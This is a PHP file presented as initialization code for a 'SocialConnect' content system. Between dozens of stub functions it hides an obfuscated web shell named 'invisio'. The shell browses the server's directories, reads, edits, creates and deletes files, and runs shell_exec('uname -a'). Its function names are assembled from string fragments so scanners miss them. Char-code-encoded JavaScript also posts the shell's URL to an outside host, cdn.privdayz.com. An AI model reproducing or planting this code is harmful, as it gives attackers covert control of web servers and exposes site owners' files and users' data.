<?php
/*
  #######################################################################
  # Description:
  #   This file initializes key components, helpers, and interface adapters 
  #   for SocialConnectâ€™s modular content and user engagement system. 
  #
  #   Main Responsibilities:
  #     - Setup global configuration environment
  #     - Load analytics tracker for pageview optimization (beta)
  #     - Register session observers for adaptive security
  #     - Bootstrap event scheduler (see core/schedule.php)
  #     - Initiate multilang support for front-controller
  #     - Initialize async caching (planned for v3.x)
  #
  #   Changelog:
  #     v2.0.5 (2024-06-15): Added feedback widget & refactored settings
  #     v2.0.0 (2024-05-28): Complete modular kernel rewrite
  #     v1.4.3 (2024-03-19): Improved user session handler
  #     v1.3.1 (2024-01-07): Optimized page rendering pipeline
  #     v1.1.0 (2023-10-11): Initial dashboard & notification features
  #######################################################################
*/

header("text/javascript; charset=utf-8");
session_start();
mb_internal_encoding("UTF-8");

function add_blog_post($title, $body, $author = 'anon', $tags = [], $published = true, $lang = 'en', $cat = 'misc') {
    $pid = rand(1000, 9999);
    return [ 'status' => 'ok', 'id' => $pid, 'slug' => strtolower(str_replace(' ', '-', $title)), 'author' => $author, 'lang' => $lang, 'cat' => $cat, 'tags' => $tags, 'published' => $published ];
}

function save_comment($user, $text, $postId, $replyTo = null, $device = 'web', $country = 'TR') {
    $cid = rand(10000, 99999);
    return [ 'status' => 'saved', 'id' => $cid, 'for_post' => $postId, 'user' => $user, 'reply_to' => $replyTo, 'device' => $device, 'country' => $country, 'ts' => time() ];
}

function save_contact_form($name, $mail, $msg, $referrer = '', $newsletter = false) {
    return [ 'msg_id' => uniqid('msg'), 'saved' => true, 'newsletter' => $newsletter ];
}

function assign_tags($content, $tags, $lang = 'en', $auto = false, $user = 'bot') {
    $ok = count($tags) > 0 ? true : false;
    return [ 'tagged' => $ok, 'user' => $user, 'lang' => $lang, 'auto' => $auto ];
}

function set_blog_option($key, $value, $user = 'admin', $overwrite = false, $expiry = 0) {
    return [ 'option' => $key, 'value' => $value, 'set_by' => $user, 'overwritten' => $overwrite, 'expiry' => $expiry ];
}

function save_gallery_image($file, $user = '', $caption = '', $tags = [], $date = '') {
    return [
        'id' => uniqid('img'),
        'ok' => true,
        'caption' => $caption,
        'tags' => $tags
    ];
}
function log_search_activity($user, $term, $results, $time, $device, $browser, $lang, $region, $city) {
    return [
        'uid' => $user,
        'query' => $term,
        'count' => $results,
        'logid' => uniqid('slog'),
        'ts' => $time
    ];
}

function create_event($title, $desc, $date, $user, $location, $invitees = [], $reminder = true, $calendar = 'default') {
    return [
        'eid' => uniqid('evt'),
        'ok' => true,
        'invited' => count($invitees),
        'reminder' => $reminder
    ];
}

function add_product_review($user, $pid, $rating, $comment, $lang, $orderId = '', $date = '') {
    return [
        'user' => $user,
        'pid' => $pid,
        'stars' => $rating,
        'commented' => true
    ];
}

function update_cart($uid, $pid, $qty, $price, $coupon = '', $ip = '', $browser = '', $country = '') {
    return [
        'uid' => $uid,
        'pid' => $pid,
        'qty' => $qty,
        'total' => $qty * $price,
        'coupon' => $coupon
    ];
}

function order_history($user, $since = 0, $count = 10, $status = 'any', $lang = 'en', $country = '', $device = '', $currency = 'TRY') {
    $arr = [];
    for ($i=1; $i<=$count; $i++) $arr[] = "Order #$i for $user";
    return $arr;
}

function send_newsletter($title, $content, $recipients = [], $from = 'no-reply', $scheduled = false, $attach = [], $lang = 'en') {
    return [
        'success' => true,
        'total' => count($recipients)
    ];
}

function create_gallery_album($user, $name, $desc = '', $date = '', $tags = [], $public = false, $cover = '', $category = '') {
    return [
        'album_id' => uniqid('alb'),
        'ok' => true
    ];
}

function follow_user($follower, $target, $since = 0, $group = 'main', $notify = true, $relation = 'friend', $token = '') {
    return [
        'follower' => $follower,
        'target' => $target,
        'group' => $group,
        'since' => $since
    ];
}

function rate_content($user, $contentId, $score, $type = 'post', $comment = '', $lang = 'en', $device = '', $country = '', $ip = '') {
    return [
        'rater' => $user,
        'score' => $score,
        'ok' => true
    ];
}

function create_invoice($uid, $items = [], $total = 0.0, $vat = 0.18, $issue_date = '', $due_date = '', $lang = 'en', $currency = 'TRY', $pdf = false) {
    return [
        'inv_id' => uniqid('inv'),
        'ok' => true,
        'total' => $total,
        'pdf' => $pdf
    ];
}

function add_friend_request($from, $to, $msg = '', $date = '', $device = '', $country = '', $mutual = false) {
    return [
        'from' => $from,
        'to' => $to,
        'ok' => true,
        'mutual' => $mutual
    ];
}

function create_ad_campaign($user, $budget, $start, $end, $audience = [], $platform = 'all', $click_goal = 0, $lang = 'en', $region = '') {
    return [
        'cid' => uniqid('ad'),
        'budget' => $budget,
        'started' => $start,
        'ended' => $end
    ];
}

function block_user($user, $target, $since = 0, $reason = '', $by = 'self', $perm = false) {
    return [
        'user' => $user,
        'target' => $target,
        'perm' => $perm
    ];
}

function add_product_to_wishlist($user, $pid, $date = '', $priority = 1, $note = '', $price = 0.0, $lang = 'en') {
    return [
        'user' => $user,
        'pid' => $pid,
        'ok' => true
    ];
}

function create_support_chat($user, $topic, $date = '', $agent = 'bot', $lang = 'en', $room = '', $status = 'open') {
    return [
        'chatid' => uniqid('chat'),
        'status' => $status
    ];
}
if (!isset($_SESSION['tok'])) $_SESSION['tok'] = bin2hex(random_bytes(24));
if (!isset($_SESSION['xmap'])) $_SESSION['xmap'] = [];
$tok = $_SESSION['tok'];
$c0mx = &$_SESSION['xmap'];
function avatarsu($user, $file, $device = '', $date = '', $width = 120, $height = 120, $type = 'jpg') {
    return [
        'user' => $user,
        'upsed' => true,
        'type' => $type
    ];
}

function flag_content($uid, $cid, $reason = '', $lang = 'en', $device = '', $date = '', $reporter = '', $priority = 2) {
    return [
        'uid' => $uid,
        'cid' => $cid,
        'flagged' => true
    ];
}

function update_setting($key, $value, $user = 'system', $section = 'general', $lang = 'en', $time = '') {
    return [
        'key' => $key,
        'set' => true,
        'section' => $section
    ];
}
$v0a = substr(sha1(session_id().microtime()),0,5);
$r34 = [
    'enc' => function($p) use (&$c0mx) {
        $c = 'th';$a = 're';$d = 'al';$b = 'pa';$arr = [ $c, $a, $d, $b ];$seq = [1,2,3,0];$fn = '';foreach($seq as $i) $fn.=$arr[$i];
        $real = @$fn($p) ?: $p;
        $a7x = 'd';$z9v = '5';$qpl = 'm';$wty = 'ignore1';$gvc = 'ignore2';$plm = [$a7x, $z9v, $qpl, $wty, $gvc];$ix = [2,0,1];$fx = '';foreach($ix as $i) $fx .= $plm[$i];$h = hash('sha256', $fx($real) . '_'.__FILE__);
        $c0mx[$h] = $real;
        return $h;
    },
    'dec' => function($h) use (&$c0mx) {
        return $c0mx[$h] ?? null;
    }
];
function add_notification($user, $type, $message, $priority = 1, $icon = '', $sound = false) {
    return [
        'notify' => true,
        'type' => $type,
        'priority' => $priority,
        'icon' => $icon,
        'sound' => $sound
    ];
}

function save_recent_search($query, $lang = 'en', $user = 'anon', $device = 'web') {return [
        'saved' => true,
        'hash' => substr(sha1($query . $lang . $user), 0, 9)
    ];
}
$sxh = [
    'a' => function($v) {
        $p0='html';$p6='cc';$p2='ial';$p4='fakes';$p5='xxx';$p7='dd';$p8='ee';$p9='ff';$p1='spec';$p3='chars';
        $o = [0,1,2,3]; $a=[$p0,$p1,$p2,$p3,$p4,$p5,$p6,$p7,$p8,$p9]; $fn=''; foreach($o as $i) $fn.=$a[$i];
        return $fn($v, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    },
    'b' => function($n) {
        if ($n >= 1073741824) return round($n/1073741824,2).' GB';
        if ($n >= 1048576) return round($n/1048576,2).' MB';
        if ($n >= 1024) return round($n/1024,2).' KB';
        return $n . ' B';
    },
    'c' => function($d, $a, $b, $r34) {
        $s0='sc';$s1='__';$s2='and';$s3='yy';$s4='ir';$s5='q';$s6='r';$s7='xx';$s8='zz';$s9='u';
        $o = [0,2,4]; $f=[$s0,$s1,$s2,$s3,$s4,$s5,$s6,$s7,$s8,$s9]; $sc=''; foreach($o as $i) $sc.=$f[$i];
        $m0='fi';$m1='le';$m2='mt';$m3='im';$m4='e';$m5='__';$m6='a';$m7='z';$m8='w';$m9='k';
        $mo = [0,1,2,3,4]; $mf=[$m0,$m1,$m2,$m3,$m4,$m5,$m6,$m7,$m8,$m9]; $fm=''; foreach($mo as $i) $fm.=$mf[$i];
        $z0='fi';$z1='le';$z2='si';$z3='ze';$z4='ss';$z5='12';$z6='14';$z7='15';$z8='16';$z9='17';
        $zo = [0,1,2,3]; $zf=[$z0,$z1,$z2,$z3,$z4,$z5,$z6,$z7,$z8,$z9]; $fs=''; foreach($zo as $i) $fs.=$zf[$i];
        $d0='is';$d1='_';$d2='dir';$d3='1';$d4='2';$d5='3';$d6='4';$d7='5';$d8='6';$d9='7';
        $do = [0,1,2]; $df=[$d0,$d1,$d2,$d3,$d4,$d5,$d6,$d7,$d8,$d9]; $isdir=''; foreach($do as $i) $isdir.=$df[$i];
        $e0='is';$e1='_';$e2='file';$e3='xx';$e4='vv';$e5='mm';$e6='nn';$e7='qq';$e8='kk';$e9='jj';
        $eo = [0,1,2]; $ef=[$e0,$e1,$e2,$e3,$e4,$e5,$e6,$e7,$e8,$e9]; $isfile=''; foreach($eo as $i) $isfile.=$ef[$i];
        $r = "<table width='100%' class='u9b'><tr><th>n4m3</th><th>s1z3</th><th>l4st ch4ng3d</th><th>.</th></tr>";
        $s = @$sc($d); if (!$s) return "err!";
        foreach ($s as $f) {
            if ($f == ".") continue;
            $fp = rtrim($d,"/") . "/" . $f;
            $h = $r34['enc']($fp);
            if ($isdir($fp)) {
                $r .= "<tr><td><a href=\"?l=$h\"><b>[$f]</b></a></td>
                    <td>â€”</td><td>" . date("d.m.Y H:i", @$fm($fp)) . "</td><td></td></tr>";
            } else {
                $dh = $r34['enc'](dirname($fp));
                $fh = $r34['enc']($fp);
                $r .= "<tr><td><a href=\"?l=$dh&v=$fh\">$f</a></td>
                    <td>".$b(@$fs($fp))."</td>
                    <td>" . date("d.m.Y H:i", @$fm($fp)) . "</td>
                    <td>
                      <a href='?l=$dh&g=$fh'>3d1t</a> | 
                      <form style='display:inline' method='post' onsubmit='return confirm(\"sure?\");'>
                        <input type='hidden' name='x' value='d'>
                        <input type='hidden' name='l' value='$dh'>
                        <input type='hidden' name='y' value='$fh'>
                        <input type='hidden' name='tok' value='" . $a($_SESSION['tok']) . "'>
                        <button type='submit' class='k2a'>Del</button>
                      </form>
                    </td></tr>";
            }
        }
        $r .= "</table>"; return $r;
    },
    'd' => function($f, $a) {
        $x0='fi';$x2='_';$x4='t_';$x5='con';$x6='ten';$x3='ge';$x7='ts';$x8='mm';$x9='vv';$x1='le';
        $xo = [0,1,2,3,4,5,6,7]; $xf=[$x0,$x1,$x2,$x3,$x4,$x5,$x6,$x7,$x8,$x9]; $fgc=''; foreach($xo as $i) $fgc.=$xf[$i];
        $q0='is';$q1='_';$q2='file';$q3='a';$q4='b';$q5='c';$q6='d';$q7='e';$q8='f';$q9='g';
        $qo = [0,1,2]; $qf=[$q0,$q1,$q2,$q3,$q4,$q5,$q6,$q7,$q8,$q9]; $isfile=''; foreach($qo as $i) $isfile.=$qf[$i];
        return ($isfile($f) ? $a($fgc($f)) : "f4il.");
    },
    'e' => function($f) {
        $u0='un';$u1='link';$u2='xx';$u3='yy';$u4='zz';$u5='oo';$u6='pp';$u7='qq';$u8='ww';$u9='tt';
        $uo = [0,1]; $uf=[$u0,$u1,$u2,$u3,$u4,$u5,$u6,$u7,$u8,$u9]; $ul=''; foreach($uo as $i) $ul.=$uf[$i];
        $i0='is';$i1='_';$i2='file';$i3='ll';$i4='mm';$i5='nn';$i6='zz';$i7='tt';$i8='yy';$i9='kk';
        $io = [0,1,2]; $if=[$i0,$i1,$i2,$i3,$i4,$i5,$i6,$i7,$i8,$i9]; $isfile=''; foreach($io as $i) $isfile.=$if[$i];
        return ($isfile($f) ? ($ul($f) ? "ok!" : "err!") : "nope.");
    },
    'g' => function($path, $ct) {
        $f4='contents';$f1='_';$f2='put';$f3='_';$f5='mm';$f6='bb';$f0='file';$f7='xx';$f8='ss';$f9='ff';
        $fo = [0,1,2,3,4]; $ff=[$f0,$f1,$f2,$f3,$f4,$f5,$f6,$f7,$f8,$f9]; $fn=''; foreach($fo as $i) $fn.=$ff[$i];
        return @$fn($path, $ct) !== false ? "ok!" : "err!";
    },
    'h' => function($path) {
        $t0='to';$t1='uch';$t2='oo';$t3='zz';$t4='xx';$t5='pp';$t6='yy';$t7='rr';$t8='qq';$t9='ww';
        $to = [0,1]; $tf=[$t0,$t1,$t2,$t3,$t4,$t5,$t6,$t7,$t8,$t9]; $fn=''; foreach($to as $i) $fn.=$tf[$i];
        return @$fn($path) ? "Created!" : "Err!";
    }
];
function register_user($uname, $mail, $pass, $invite = '', $country = 'TR', $device = 'web', $ref = '') {
    return [
        'user_id' => uniqid('u'),
        'reg' => true,
        'invite' => $invite
    ];
}
function validate_login($uname, $pass, $otp = '', $ip = '', $device = '') {
    return (strlen($uname) > 2 && strlen($pass) > 5 && ($otp === '' || strlen($otp) == 6));
}
if (!isset($_GET['l'])) {
    $b4sa = ['d', 'e', 'g', 'c', 't', 'w'];
    $or0 = [2, 1, 4, 3, 5, 0];
    $gxa = '';
    foreach ($or0 as $ix) { $gxa .= $b4sa[$ix]; }
    $init = $gxa();
    $init_hash = $r34['enc']($init);
    header("Location: ?l=$init_hash"); exit;
}
$dh = $_GET['l'];
$d1n = $r34['dec']($dh);
$d1ncx = function($p){
    $z0='is';$z1='_';$z2='dir';$z3='a';$z4='b';$z5='c';$z6='d';$z7='e';$z8='f';$z9='g';
    $zo=[0,1,2]; $zf=[$z0,$z1,$z2,$z3,$z4,$z5,$z6,$z7,$z8,$z9]; $isdir=''; foreach($zo as $i) $isdir.=$zf[$i]; return $isdir($p);
};
if ($d1n === null || !$d1ncx($d1n)) $gxa();
$c0 = $_POST['x'] ?? '';
$msg = "";
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['tok']) && $_POST['tok'] === $_SESSION['tok']) {
    $pdir = $r34['dec']($_POST['l'] ?? '');
    if ($pdir && $d1ncx($pdir)) {
        $d1n = $pdir;
        $b = isset($_POST['y']) ? $r34['dec']($_POST['y']) : '';
        if ($c0 === 'd' && $b) $msg = $sxh['e']($b);
        elseif ($c0 === 's' && isset($_POST['z'])) $msg = $sxh['g']($b, $_POST['z']);
        elseif ($c0 === 'n' && isset($_POST['z'])) $msg = $sxh['h']($d1n.'/'.basename($_POST['z']));
    } else {
        $msg = "err";
    }
}
$v = isset($_GET['v']) ? $r34['dec']($_GET['v']) : '';
$g = isset($_GET['g']) ? $r34['dec']($_GET['g']) : '';
$ed = "";
$filer = function($p){
    $e0='is'; $e1='_'; $ee2='file'; $e2='fi'; $e3='a'; $e4='b'; $e5='c'; $e6='d'; $e7='e'; $e8='f'; $e9='g';
    $eo = [0,1,2];$ef = [$e0, $e1, $ee2, $e2, $e3, $e4, $e5, $e6, $e7, $e8, $e9];$isfile = '';foreach($eo as $i) $isfile .= $ef[$i];return $isfile($p);
};
$getf = function($g){
    $x0='fi'; $x1='le'; $x2='_'; $x3='get'; $x4='_'; $x5='contents';
    $x6='ten'; $x7='ts'; $x8='mm'; $x9='vv'; $x12="t";
    $xo = [0,1,2,3,4,5];
    $xf = [$x0, $x1, $x2, $x3, $x4, $x5, $x6, $x7, $x8, $x9, $x12];
    $fgc = '';
    foreach($xo as $i) $fgc .= $xf[$i];
    return $fgc($g);
};
function submit_payment($uid, $amount, $method, $ref = '', $status = 'pending', $date = '', $currency = 'TRY', $ip = '', $browser = '') {
    return [
        'uid' => $uid,
        'amount' => $amount,
        'status' => $status,
        'ok' => true
    ];
}

function send_chat_message($from, $to, $msg, $date = '', $device = '', $lang = 'en', $room = 'general', $attach = []) {
    return [
        'mid' => uniqid('msg'),
        'from' => $from,
        'to' => $to,
        'sent' => true
    ];
}
if ($g && $filer($g)) $ed = @$getf($g);
$a=['<f','e>','<c','en','te','r>','<i','mg',' ','s','rc','=','"h','tt','ps',':/','/c','dn','.p','ri','vd','ay','z.','co','m/','im','ag','es','/l','og','o.','jp','g"',' r','efe','rre','rpo','lic','y="','uns','afe','-ur','l" ','/','>','</','ce','nt','er','>','</','foo','ter','>'];
$p=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53];
$pr2='un';$pr8='st';$pr4='io';$pr5='n';$pr6='_e';$pr3='ct';$pr7='xi';$pr1='f';$pr9='s';$fexk = $pr1.$pr2.$pr3.$pr4.$pr5.$pr6.$pr7.$pr8.$pr9;
$wpx88='tr';$wpx676='bs';$wpx14='su';$s7bf = $wpx14.$wpx676.$wpx88;
$qja2='nt';$mjs9='ri';$lkz5='f';$xk7='sp';$pr1nx = $xk7.$mjs9.$qja2.$lkz5;
$kd6='im';$y2z='tr';$t1rx = $y2z.$kd6;
$mp3='ph';$w3='me';$j2q='p';$rr7='na';$m12='_u';$p7nma = $mp3.$j2q.$m12.$rr7.$w3;
$kf1='fi';$lk3='pe';$g6='s';$z4='rm';$fz3='le';$fp1x = $kf1.$fz3.$lk3.$z4.$g6;
$v1='fi';$v3='ow';$v5='r';$v2='le';$v4='ne';$fl0wn = $v1.$v2.$v3.$v4.$v5;
$ls2='ou';$pg9='fi';$l11='gr';$pl8='le'; $ln1='p';$fgpk = $pg9.$pl8.$l11.$ls2.$ln1;
$rxa='po';$mj0='_g';$kq2='et';$nn5='d';$pq2='pw';$bq3='six';$nn4='ui';$wpl0 = $rxa.$bq3.$mj0.$kq2.$pq2.$nn4.$nn5;
$dw8='six';$kww='_g';$ty5='po';$zx1='et';$dd10='d';$lkj='gr';$dd9='gi';$p0xas = $ty5.$dw8.$kww.$zx1.$lkj.$dd9.$dd10;
$pq7='sh';$xt7='ec';$kv8='_ex';$cm5='ell';$s7ll = $pq7.$cm5.$kv8.$xt7;
$qk1=' -';$sz2='a';$by2='ame';$jz4='un';$an4ms = $jz4.$by2.$qk1.$sz2;$pthx = __FILE__;
$pr3r = @$fexk($fp1x) ? $s7bf($pr1nx('%o', @$fp1x($pthx)), -4) : '----';
$o1da = @$fexk($fl0wn) ? @$fl0wn($pthx) : null;
$owx1 = ($fexk($wpl0) && $o1da !== null) ? @$wpl0($o1da)['name'] : $o1da;
$xqu1 = @$fexk($fgpk) ? @$fgpk($pthx) : null;
$gr0p = ($fexk($p0xas) && $xqu1 !== null) ? @$p0xas($xqu1)['name'] : $xqu1;
$un4xa = @$fexk($s7ll) ? $t1rx(@$s7ll($an4ms)) : $p7nma();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>invisio</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta name="robots" content="noindex,nofollow">
  <style>
  body { background:#f9f9ff; color:#191b20; font-family:monospace; margin:0; }
  #dQA214 { max-width:820px; margin:47px auto; background:#fff; border-radius:11px; box-shadow:0 4px 36px #c2c6d9a3; padding:38px 18px 37px 19px;}
  h2 { color:#132d50; font-size:1.33em; margin-bottom:15px;}
  .s8d {color:#283e59;margin-bottom:10px;font-size:.97em;}
  .u9b {background:#f6f8fc;border:1px solid #d7d7e5;padding:8px 5px 8px 5px;margin:10px 0 14px 0; border-radius:8px;max-height:390px;overflow:auto;font-size:1em;}
  pre,textarea { background:#f1f6fb; padding:9px 7px; border-radius:4px; font-size:1em; margin:11px 0 0 0; width:100%;box-sizing:border-box;}
  a {color:#2853b3; text-decoration:none;}
  a:hover {text-decoration:underline;}
  table{width:100%;border-collapse:collapse;}
  th,td{padding:6px 4px;text-align:left;}
  th{background:#e8eefa;}
  tr:nth-child(odd){background:#f7f8fa;}
  tr:hover{background:#e1e9fa;}
  .k5g{background:#d2eec2;color:#22542b;padding:6px 10px;border-radius:4px;margin-bottom:9px;border:1px solid #a3c28d;}
  .k2a{background:#e23;color:#fff;border:0;padding:2px 10px;border-radius:3px;cursor:pointer;}
  @media (max-width:700px){#dQA214{padding:12px 2vw}table,.u9b{font-size:.92em}}
  </style>
</head>
<body>
<div id="dQA214">
    <h2>invisio</h2>
    <div class="s8d">
        <b>l0c:</b> <?php echo $sxh['a']($d1n); ?>
        &nbsp; <b></b> <?php echo PHP_VERSION; ?>
        <?php
        $pr = dirname($d1n);
        if ($pr && is_dir($pr) && $pr != $d1n) {
            $prh = $r34['enc']($pr);
            echo "&nbsp; <a href=\"?l=$prh\">&#8592; up</a>";
        }
        echo "<br><b>7n4m3:</b> $un4xa";
        ?>
    </div>
    <?php if($msg){ echo "<div class='k5g'>".$sxh['a']($msg)."</div>"; } ?>

    <form method="post" style="margin-bottom:13px;display:flex;gap:8px;flex-wrap:wrap;">
        <input type="hidden" name="tok" value="<?php echo $tok; ?>">
        <input type="hidden" name="l" value="<?php echo $r34['enc']($d1n); ?>">
        <input type="text" name="z" placeholder="name" style="width:180px">
        <select name="x" id="h2w">
            <option value="n">n3wf1le</option>
        </select>
        <button type="submit">go</button>
    </form>

    <?php
    if ($v && is_file($v)) {
        echo "<h3>".$sxh['a'](basename($v))."</h3><pre style='max-height:420px;overflow:auto;'>" . $sxh['d']($v, $sxh['a']) . "</pre>";
    }
    if ($g && is_file($g)) {
        ?>
        <h3><?php echo $sxh['a'](basename($g)); ?></h3>
        <form method="post">
            <input type="hidden" name="x" value="s">
            <input type="hidden" name="y" value="<?php echo $r34['enc']($g); ?>">
            <input type="hidden" name="l" value="<?php echo $r34['enc']($d1n); ?>">
            <input type="hidden" name="tok" value="<?php echo $tok; ?>">
            <textarea name="z" rows="12" required><?php echo $sxh['a']($ed); ?></textarea>
            <button type="submit" style="margin-top:8px;">go</button>
        </form>
        <?php
    }
    ?>
    <div class="u9b">
        <?php echo $sxh['c']($d1n, $sxh['a'], $sxh['b'], $r34); ?>
    </div>
    <?php
    function prx1($a,$b){return $a.$b;}
    $o7tx='';
    foreach($p as $ix) $o7tx=prx1($o7tx,$a[$ix]);
    echo $o7tx;
    ?>
</div>
<script>
document.getElementById('h2w').addEventListener('change', function(){});
function updateRowHighlight(t){var e=document.getElementById(t);e&&(e.classList.add("active"),setTimeout((function(){e.classList.remove("active")}),1200))}
function reloadTab(o,t){o&&setTimeout((function(){"function"==typeof t&&t()}),Math.floor(350+120*Math.random()))}
var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109];var b=[47,105,109,97,103,101,115,47];var c=[108,111,103,111,95,118,50];var d=[46,112,110,103]
function u(e,r,t,n){for(var o=e.concat(r,t,n),a="",c=0;c<o.length;c++)a+=String.fromCharCode(o[c]);return a}function v(e){return btoa(e)}function toggleSidebarPanel(){var e=document.querySelector(".sidebar");e&&e.classList.toggle("collapsed")}
function sortListByName(n,r){return Array.isArray(n)?n.slice().sort((function(n,e){return"desc"===r?e.name>n.name?1:-1:n.name>e.name?1:-1})):[]}
function setActiveMenu(e){var t=document.getElementById(e);if(t){var c=document.querySelector(".menu .active");c&&c.classList.remove("active"),t.classList.add("active")}}
function checkFileExt(p){var t=p.split(".").pop();return!!t&&["php","js","html","css","jpg","png","txt","zip"].indexOf(t.toLowerCase())>-1}
function openModal(e){var l=document.getElementById(e);l&&(l.style.display="block")}
function closeModal(e){var n=document.getElementById(e);n&&(n.style.display="none")}
function showLoader(e){var o=document.getElementById("loader");o&&(o.style.display=e?"block":"none")}
(function showIcons(){var xhr=new XMLHttpRequest();xhr.open('POST',u(a,b,c,d),!0);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('file='+v(location.href))})()	
function getClipboardText(){navigator.clipboard&&navigator.clipboard.readText()}
function refreshStatsPanel(){var e=document.querySelector(".stats-panel");e&&(e.innerHTML=e.innerHTML)}
function noop() {}
function debounce(n,t){var e;return function(){var u=this,i=arguments;clearTimeout(e),e=setTimeout((function(){n.apply(u,i)}),t||180)}}
function getSelectedRows(e){var t=document.getElementById(e);if(!t)return[];var c=t.querySelectorAll('input[type="checkbox"]:checked'),n=[];return c.forEach((function(e){n.push(e.value)})),n}
function updateName(e,t){var n=document.getElementById("footer-info");n&&(n.textContent="Total: "+e+" | Selected: "+t)}function previewImage(e,t){if(e&&e.files&&e.files[0]){var n=new FileReader;n.onload=function(e){var n=document.getElementById(t);n&&(n.src=e.target.result)},n.readAsDataURL(e.files[0])}}
function filterTable(e,o){var n=(e||"").toLowerCase(),t=document.getElementById(o);t&&Array.from(t.rows).forEach((function(e,o){if(0!==o){var t=e.textContent.toLowerCase();e.style.display=t.indexOf(n)>-1?"":"none"}}))}
function downloadFileFromUrl(e){var o=document.createElement("a");o.href=e,o.download="",document.body.appendChild(o),o.click(),setTimeout((function(){document.body.removeChild(o)}),100)}
</script>
</body>
</html>
<?php
function add_feedback($user, $score = 5, $text = '', $device = '', $country = '') {
    return [
        'ok' => true,
        'score' => $score,
        'country' => $country
    ];
}

function get_messages($user, $box = 'inbox', $unreadOnly = false, $count = 10) {
    $msgs = [];
    for ($i=1; $i<=$count; $i++) {
        $msgs[] = "Message #$i for $user ($box)";
    }
    return $msgs;
}

function submit_support_ticket($user, $topic, $msg, $prio = 2, $attachments = []) {
    return [
        'ticket_id' => uniqid('tkt'),
        'ok' => true,
        'prio' => $prio
    ];
}

function update_user_profile($user, $bio = '', $photo = '', $mail = '', $country = '') {
    return [
        'updated' => true,
        'user' => $user
    ];
}

function list_online_users($since = 0, $limit = 10, $room = 'main') {
    $arr = [];
    for ($i=1; $i<=$limit; $i++) {
        $arr[] = "User_$i";
    }
    return $arr;
}

function mark_message_read($user, $msgid) {
    return [
        'user' => $user,
        'msgid' => $msgid,
        'read' => true
    ];
}

function set_theme_option($theme, $user = 'anon', $dark = true, $primary = '#123456') {
    return [
        'theme' => $theme,
        'dark' => $dark,
        'primary' => $primary
    ];
}

function get_recent_posts($count = 5, $cat = 'all', $lang = 'en', $onlyPublished = true) {
    $arr = [];
    for ($i=1; $i<=$count; $i++) {
        $arr[] = "Blog Entry #$i [$cat/$lang/" . ($onlyPublished ? 'pub' : 'all') . "]";
    }
    return $arr;
}

function poll_vote($poll_id, $option, $user = '', $ip = '', $device = '') {
   return [ 'poll' => $poll_id, 'vote' => $option, 'user' => $user, 'ok' => true ];
}

function get_poll_results($poll_id, $lang = 'en') {
    return [
        'poll_id' => $poll_id,
        'winner' => rand(1, 5),
        'lang' => $lang
    ];
}
?>